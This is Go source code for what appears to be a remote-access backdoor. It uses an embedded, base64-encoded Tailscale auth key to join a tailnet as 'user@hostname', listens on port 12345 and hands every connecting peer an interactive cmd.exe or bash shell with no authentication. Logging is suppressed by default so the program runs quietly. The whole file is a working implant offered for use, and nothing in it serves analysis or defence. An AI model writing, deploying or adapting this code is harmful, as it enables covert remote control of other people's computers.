package main

import (
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"

	"tailscale.com/tsnet"
)

//go:embed config.json
var configData []byte

type Config struct {
	EncodedAuthKey string `json:"encodedAuthKey"`
	LogToConsole   bool   `json:"logToConsole"`
}

func handleConnection(connection net.Conn) {
	log.Printf("received connection from %v\n", connection.RemoteAddr().String())
	connection.Write([]byte("connection successful, shell session initiated\n"))

	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/bash"
	}

	cmd := exec.Command(shell)
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection
	cmd.Run()
}

func main() {
	// Load the config from embedded JSON
	var cfg Config
	if err := json.Unmarshal(configData, &cfg); err != nil {
		log.Printf("Failed to parse config: %v\n", err)
		return
	}

	if !cfg.LogToConsole {
		log.SetOutput(io.Discard)
	}

	decodedAuthKey, err := base64.StdEncoding.DecodeString(cfg.EncodedAuthKey)
	if err != nil {
		log.Printf("Error decoding auth key: %v\n", err)
		return
	}

	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Error getting hostname: %v\n", err)
		return
	}

	currentUser, err := user.Current()
	if err != nil {
		log.Printf("Error getting current user: %v\n", err)
		return
	}

	fullHostname := fmt.Sprintf("%s@%s", currentUser.Username, hostname)

	s := &tsnet.Server{
		Hostname: fullHostname,
		AuthKey:  string(decodedAuthKey),
		Logf:     func(string, ...any) {},
	}
	defer s.Close()

	port := 12345
	listener, err := s.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Printf("Error initializing listener: %v\n", err)
		return
	}
	log.Printf("Tailscale server listening on tcp port %d as user %s...\n", port, fullHostname)

	for {
		connection, err := listener.Accept()
		if err != nil {
			log.Printf("Connection error: %v\n", err)
			continue
		}
		go handleConnection(connection)
	}
}
